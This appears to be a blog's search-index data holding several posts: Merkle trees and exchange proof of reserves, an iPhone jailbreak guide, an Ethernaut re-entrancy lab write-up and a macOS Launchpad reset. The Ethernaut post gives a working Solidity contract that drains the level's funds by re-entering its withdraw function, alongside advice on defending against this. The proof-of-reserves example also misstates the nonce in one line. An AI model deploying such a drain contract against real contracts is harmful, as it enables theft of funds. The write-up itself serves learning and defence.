父节点可以位于树的不同层次，这取决于整个树的大小，父节点总是位于叶节点之上。父节点的值是由它下面的节点的哈希值决定的，通常从左到右开始。由于不同的输入总是会产生不同的哈希值，不考虑哈希值的碰撞，节点哈希值的连接顺序很重要。值得一提的是，根据树的大小，父节点可以Hash其他父节点。\n\n根节点 - 根节点位于树的顶端，由位于它下面的两个父节点的哈希值连接而成，同样从左到右开始。任何默克尔树上都只有一个根节点，根节点拥有根哈希值。\n\n\n\n\n\nVisualization of Merkle Tree\n\nVisualization of Merkle Tree Proof\n\nVisualization of Invalid Merkle Tree Proofs\n\nVisualization of Bitcoin Merkle Tree\n\nMerkle 树实现（JavaScript）安装官方库地址：https://github.com/merkletreejs/merkletreejs\n安装\nnpm install merkletreejs\n\n构建树const &#123; MerkleTree &#125; = require(&#x27;merkletreejs&#x27;)const SHA256 = require(&#x27;crypto-js/sha256&#x27;)const leaves = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;].map(x =&gt; SHA256(x))const tree = new MerkleTree(leaves, SHA256)const root = tree.getRoot().toString(&#x27;hex&#x27;)console.log(tree.toString())console.log(root)\n\n\n衍生出我们的叶子节点。在一棵树上位于叶子节点正上方的每个父节点，最多只能Hash两个叶子节点。如果叶子节点的数量不均匀，父节点将处理一个叶子节点。每个叶子节点应该是某种形式的Hash数据，我们这里使用sha256来哈希所有数据。\n对所有数据进行了哈希后，从而获得了我们的叶子节点 leaves，现在就可以创建Merkle树对象。我们使用merkletreejs库，通过调用new MerkleTree()函数，将叶子节点作为第一个参数，哈希算法作为第二个参数。\n现在已经得出了一个完整的Merkle树，可以通过调用Merkle树对象的getRoot()方法来获得根哈希值。记住，Merkle树的根哈希值是树上根节点正下方的两个前面的父节点的哈希值。\n\nMerkle树的巧妙之处在于，它不需要任何关于原始数据块的知识来验证一个节点是否属于我们的树。如果我们试图验证一个叶子节点属于我们的树，只需要知道直接相邻的叶子节点哈希值(如果有的话)，以及叶子节点正上方相邻的父节点哈希值就可以了。这个信息被称为proof。\n生成证明和验证const leaf = SHA256(&#x27;a&#x27;)const proof = tree.getProof(leaf)console.log(tree.verify(proof, leaf, root)) // trueconst verified = MerkleTree.verify(proof, leaf, root, SHA256)console.log(verified)\n\n现在我们有了Merkle树对象和它的根哈希值，我们准备开始考虑如何提供Merkle证明。\n\n被验证方提供数据 a ，验证方收到数据后，使用 SHA256 进行哈希，并使用Merkle Tree对象上的getProof()方法检索证明。\n被验证方获取 proof、leaf 和 root后就可以通过 MerkleTree 的方法验证。\n\n验证失败情况如果一个无效数据试图使用有效或无效的证明来调用这个函数，生成的目标叶子节点将根本不存在于我们的Merkle树上，验证将失败。\n\n当使用无效数据生成 proof 时，在我们的 Merkle 树无法获取到 proof。\n当使用无效的数据，提供其他有效数据生成proof时，也无法通过验证。\n\nconst badLeaves = [&#x27;a&#x27;, &#x27;x&#x27;, &#x27;c&#x27;].map(x =&gt; SHA256(x))const badTree = new MerkleTree(badLeaves, SHA256)const badLeaf = SHA256(&#x27;x&#x27;)const badProof = badTree.getProof(badLeaf)console.log(badTree.verify(badProof, badLeaf, root)) // false\n\n应用NFT 白名单后端实现const &#123; MerkleTree &#125; = require(&#x27;merkletreejs&#x27;)const keccak256 = require(&#x27;keccak256&#x27;)const whitelist = [    &#x27;0x7a68Ab63Ba083916a1e4875588b61676F52Bd08b&#x27;,    &#x27;0x9e1D367A900bc7103e3f2f2af9B71ae9d29a3e58&#x27;,    &#x27;0x5191c9832B5bf6512F7216eE24cc0Ba44558993F&#x27;,    &#x27;0xdd9c4E0B11c319E980c00773296fc1bA6e3D3d23&#x27;,    &#x27;0xC4282694CE35e1b2DD7823BBF3693cfe1E99c398&#x27;]const leaves = whitelist.map(addr =&gt; keccak256(addr))const tree = new MerkleTree(leaves, keccak256)const root = tree.getHexRoot()console.log(tree.toString())console.log(root)\n发行方通过收集白名单用户地址，生成 root 哈希根。\n前端实现const leaf = keccak256(&#x27;0x7a68Ab63Ba083916a1e4875588b61676F52Bd08b&#x27;)const proof = tree.getProof(leaf)console.log(tree.getHexProof(leaf))const verified = MerkleTree.verify(proof, leaf, root, keccak256)console.log(verified)\n\n前端用户连接上钱包后，通过 API 将钱包地址发往后端，并返回指定的证明 proof。注意钱包地址的大小写。前端通过 MerkleTree.verify 就可以验证。\n合约实现// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;@openzeppelin/contracts/utils/cryptography/MerkleProof.sol&quot;;contract Merkle &#123;    bytes32 public merkleRoot = 0x2800cfa9f59cf71c57b9f8b5641b745583ef2161b84fba14d823ac3449549976;        mapping(address =&gt; bool) public whitelistClaimed;    function whitelistMint(bytes32[] calldata _merkleProof) public &#123;        require(!whitelistClaimed[msg.sender], &quot;Address has already claimed.&quot;);        bytes32 leaf = keccak256(abi.encodePacked(msg.sender));        require(MerkleProof.verify(_merkleProof, merkleRoot, leaf), &quot;Invalid proof.&quot;);        whitelistClaimed[msg.sender] = true;    &#125;&#125;\n\n准备金证明（Proof of Reserves）证明机制以下步骤针对单一资产，多资产生成多份证明机制即可。\n步骤一 公布平台资产平台公布资产的持币地址，证明其拥有的资产储备总额数量。\n步骤二 生成用户节点数据平台根据用户的资产数据，通过如下步骤生成用户结点数据：\n\n每个用户具有 userid,amount\n通过算法为每个用户生成 userid,amount,nonce,hashidhash函数为\n\ndef hash_func(userid, nonce, amount):    inputstr = userid + str(nonce) + str(amount)    hashstr  = hashlib.sha256(inputstr.encode(&quot;utf-8&quot;))    hashid   = hashstr.hexdigest()[0:HASHLEN * 2]    return hashid\n系统根据展示需求，可以选取部分hash值截断展示（本函数中，HASHLEN=8）。\n\n通过算法根据用户节点生成平衡的Merkle树，非平衡的结点进行零资产结点填充。以BTC资产为例，图中数量单位为聪，资产Merkle树类似的结构如下：\n\n步骤三 用户验证资产\n用户可以下载平台完整的平衡Merkle树数据。\n首先验证平台公布的持币地址资产是否大于等于Merkle资产树的根结点数字资产数量，如果大于等于，则证明平台拥有大于等于100%的用户储备金。\n用户可以根据app端展示的nonce等相关数据，按照上述描述的hash函数，自行计算hashID，然后在平衡Merkle树中自行搜索查找叶子结点，证明用户资产在平台公布的储备数字资产中。\n用户可以公布上述过程与数据。\n\n所有用户都可以采用上述流程进行验证。\n\n所有用户都能确认自己的资产数目在平台公布的储备资产数据中。\n没有任何用户提出资产数据被重复验证或者伪造。\n在上述两点满足的情况下，通过上述步骤即可证明平台拥有100%储备数字资产。\n\n用户验证示例如果用户在平台中，有一定数量的BTC，那么用户可以验证自己的BTC百分百资产证明。\n用户打开平台 App，获取自己的用户ID(UID)、随机数(Nonce)、余额(Amount)。\nUID: 1563256765354 &#x3D;&#x3D;&gt; 1563256765354\nNonce: 19039 &#x3D;&#x3D;&gt; 19039\nAmount: 0.13991643 &#x3D;&#x3D;&gt; 13991643\n\n注意：BTC币种的平台精度是10^8 &#x3D; 100000000，所以计算 0.13991643 * 10^8 &#x3D; 13991643\n计算字符串&#x3D; str(UID) + str(Nonce) + str(Amount)字符串 &#x3D; “1563256765354” + “13974” + “13991643”       &#x3D; “15632567653541903913991643”\n计算hash值hash计算采用SHA256算法。\nSHA256(“15632567653541903913991643”) &#x3D; 90d404dfaad97c23c2df3f1234d774dc88626825c4badc38b906e74df16e56b8\n取前16个字符，故用户HASH &#x3D; 90d404dfaad97c23\n注意：结果不区分大小写（90d404dfaad97c23 和 90D404DFAAD97C23 是一样的）\n在Merkle Tree中查找用户HASHLevel,Number,Amount,Hash0,0,1.91752000,eba80bc08c79d1060,1,47.94822258,ee350eea6f8cb4920,2,0.00054241,0d0a4c548f50dc0f0,3,0.00152490,802f09fc23f904180,4,0.11042455,30a1681b474a98cb0,5,0.10482076,add3d0d3fc1f86b50,6,0.00558000,1f1a4a83c896a74a0,7,0.19614663,0d122b896db2a3d20,8,0.95972872,1aa46995b911a0720,9,0.00066497,924c84586d6ca3050,10,0.05185066,31b6e65f5fb3eaee0,11,283.97299139,5a1b487021bb9eab0,12,0.00000239,f2333a1e42a586d30,13,0.00000024,69ed031686af93da0,14,0.00834000,6d3f2e89b0125a0d0,15,1.24884468,29b4a398123cb0e7## 在这里 ##0,16,0.13991643,90d404dfaad97c230,17,0.13252314,acdb92f515bef17e0,18,4.00350239,cf36f3061133fc620,19,0.12932834,54ee2ba25591eb900,20,0.06461708,cca2b192d0d633020,21,0.00227000,02759e7972e795500,22,0.03963867,bf68c210400a33120,23,0.03366789,7f0bf2b94f03898e0,24,177.03102948,6551016b5dcf36e70,25,0.00000481,36c32980082316db0,26,0.00000789,ec59240a475879f70,27,1.19111166,77aa7b923c1b31380,28,0.04801322,bcbe16ad3790c0c60,29,0.21463450,5d67e5c769ac58b60,30,35.29639568,44535df6e46644450,31,1.02122205,a410e18cb5e066de0,32,0.51984214,bd600e3baca65f920,33,0.00000883,2802427b1d68b4990,34,0.04932213,51cc039b07c6cc810,35,0.00573294,73a7c5ae8f7418150,36,10.13089000,9543948400babc5c。。。。。。 \n\n在Merkle Tree中找到该用户(90d404dfaad97c23)\n0,16,0.13991643,90d404dfaad97c23          \n位于Merkle树叶子层，位置为16，余额为0.13991643\n证毕。\n相关平台\nKraken 做出了解释\nCEX的梅克尔树储备证明是什么？\n\n","categories":["Web3"],"tags":["exchange","cryptography"]},{"title":"iOS 完全越狱指南（iPhone 6s 15.7.1）","url":"/2022/11/21/iOS-Complete-Jailbreak-Guide/","content":"手上有一台 iPhone 6S 15.7.1 的设备准备越狱做一些测试。\n GitHub和twitter上找到一个解决方案，并且在我的设备上成功越狱。https://github.com/palera1n/palera1n\n必读不同的设备将需要不同的步骤来越狱您的 iOS 设备。此页面将帮助您找到从哪里开始。\nhttps://ios.cfw.guide/get-started/\n以下步骤以 iPhone 6s 15.7.1 为例：\n\n\n准备工作\n**在运行 palera1n 之前，您必须从 App Store 安装 提示 应用程序。**因为脚本将其替换为 Amy 编写的名为 Pogo 的加载器应用程序。\n\n设备：iOS 15.0 ~ 15.7.1（A8 ~ A11）\n\nA10 和 A11，在越狱状态必须禁用密码\n\n\nMacOS 运行环境：\n\n安装 Python 3\n\n安装依赖：\n$ brew install libimobiledevice$ brew install ideviceinstaller\n\n\n其他准备工作可参考官方 README\n\n\n开始越狱\nclone 代码：git clone --recursive https://github.com/palera1n/palera1n &amp;&amp; cd palera1n\n\n运行：./palera1n.sh --tweaks &lt;iOS version you&#39;re on&gt; --semi-tethered\n\n在运行此命令之前将您的设备置于 DFU 模式，进入DFU模式可参考 各型号iPhone手机进入DFU模式方法教程\nsemi-tethered 标志使用 5-10GB 的存储空间，并且与 16GB 设备不兼容，如果您使用的是 16GB 设备或可用空间少于 10GB ，请不要在命令中包含 –semi-tethered 。\n如果您有 iPhone 7 或 iPhone 8，请不要在命令中包含 –semi-tethered，即使您满足上述使用标志的条件。\n如果您有仅支持 WiFi 的 iPad 或 iPod Touch，请在命令中包含 –no-baseband。\n\n\n然后您的设备将启动到 ramdisk，它将替换 Tips 应用程序和转储 blob。它还将设置引导参数和其他变量，并为 tether 做好准备或设置伪造的 rootfs。它还会为您修补内核，因此您可以使用调整。\n\n如果回到恢复&#x2F;正常模式后，需要再次将设备置于 DFU 模式\n\n设备将重启，打开 Tips 应用程序，然后点击安装\n\nSileo 应该出现在您的主屏幕上\n\n如果没有，请单击“工具”并选择“全部执行”\n\n\n\n一旦 palera1n 完成，tweaks 就可以用了。\n效果展示\n\n\n","categories":["iOS"],"tags":["Jailbreak"]},{"title":"10. Re-entrancy","url":"/2022/11/22/10-Re-entrancy/","content":"Chain: GoerliDifficulty: ●●●○○Level: https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb\n要求这一关的目标是偷走合约的所有资产.\n这些可能有帮助:\n\n不可信的合约可以在你意料之外的地方执行代码.\nFallback methods\n抛出&#x2F;恢复 bubbling\n有的时候攻击一个合约的最好方式是使用另一个合约.\n查看上方帮助页面, “控制台之外” 部分\n\n分析// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Reentrance &#123;    using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable &#123;    balances[_to] = balances[_to].add(msg.value);  &#125;  function balanceOf(address _who) public view returns (uint balance) &#123;    return balances[_who];  &#125;  function withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123;      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);      if(result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;  receive() external payable &#123;&#125;&#125;\n\n分析合约代码，关键点在于 withdraw 函数中：\n(bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);\n\n这里犯了常见的错误：未考虑调用者为另一个合约的情况。如果该合约在 fallback() 中调用相同的函数就会发生 Re-entrancy attack。\n解题\n首先打开Console，获取当前关卡合约实例地址 instance；\n\n打开 Remix IDE，创建文件 10_Re-entrancy.sol，粘贴以下代码：\n // SPDX-License-Identifier: MITpragma solidity ^0.8.4;interface IReentrance &#123;    function withdraw(uint256 _amount) external;&#125;contract HackReentrance &#123;    address levelInstance;    constructor(address _levelInstance) &#123;        levelInstance = _levelInstance;    &#125;    function claim(uint256 _amount) public &#123;        IReentrance(levelInstance).withdraw(_amount);    &#125;    fallback() external payable &#123;        IReentrance(levelInstance).withdraw(msg.value);    &#125;    receive() external payable &#123;        IReentrance(levelInstance).withdraw(msg.value);    &#125;&#125;\n\n在constructor 填入当前关卡合约实例地址后部署。\n\n为了保证被攻击合约余额能取空，查看被攻击合约余额 await getBalance(instance) \n\n调用 donate 函数将ETH存入被攻击合约，在 Console 里执行：\n await contract.donate(&quot;刚部署的攻击合约地址&quot;, &#123;value: 被攻击合约余额&#125;)\n\n回到 Remix IDE，再调用 claim 函数：\n\nvalue 填入调用 donate 函数的值\n\n\n完成关卡。\n\n\n后记Re-entrancy attack 是一种最常见的攻击。这里 就介绍了 UniSwap 在V1 时如何受到 Re-entrancy attack。\n要防止 Re-entrancy attack，最简单的办法是使用使用OpenZeppelin的 ReentrancyGuard。\nS01. 重入攻击 | WTF学院为了防止转移资产时的重入攻击, 使用 Checks-Effects-Interactions pattern 注意 call 只会返回 false 而不中断执行流. 其它方案比如 ReentrancyGuard 或 PullPayment 也可以使用.\ntransfer 和 send 不再被推荐使用, 因为他们在 Istanbul 硬分叉之后可能破坏合约 Source 1 Source 2.\n总是假设资产的接受方可能是另一个合约, 而不是一个普通的地址. 因此, 他有可能执行了他的payable fallback 之后又“重新进入” 你的合约, 这可能会打乱你的状态或是逻辑.\n重进入是一种常见的攻击. 你得随时准备好!\nThe DAO Hack著名的DAO hack 使用了重进入攻击, 窃取了受害者大量的 ether. 参见 15 lines of code that could have prevented TheDAO Hack.\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"Reset Launchpad on MacOS","url":"/2025/07/23/Reset-Launchpad-on-MacOS/","content":"Before MacOS 15.5, resetting Launchpad was a straightforward process using the Terminal command:\ndefaults write com.apple.dock ResetLaunchPad -bool true; killall Dock\n\nHowever, starting with MacOS 15.5, this command no longer works as expected. If you find that Launchpad is not functioning correctly or you want to reset it to its default state, you can follow these steps:\nsudo find 2&gt;/dev/null /private/var/folders/ -type d -name com.apple.dock.launchpad -exec rm -rf &#123;&#125; +; killall Dock\n\nSteps to Reset LaunchpadTo reset Launchpad on macOS Sequoia, follow these steps:\n\nOpen Terminal: Find Terminal in Applications &gt; Utilities or use Spotlight to search for it.\nEnter Command: Type the following command and press Enter:sudo find 2&gt;/dev/null /private/var/folders/ -type d -name com.apple.dock.launchpad -exec rm -rf &#123;&#125; +; killall Dock\n\nYou’ll need to enter your administrator password when prompted.\n\n\nVerify Reset: Open Launchpad to check if it has reset, with Apple’s default apps on the first page.\n\nNote: This method requires administrator privileges and may not fully rearrange third-party apps alphabetically, but it should reset Apple’s default apps effectively.\n","categories":["MacOS"],"tags":["Launchpad","Troubleshooting"]}]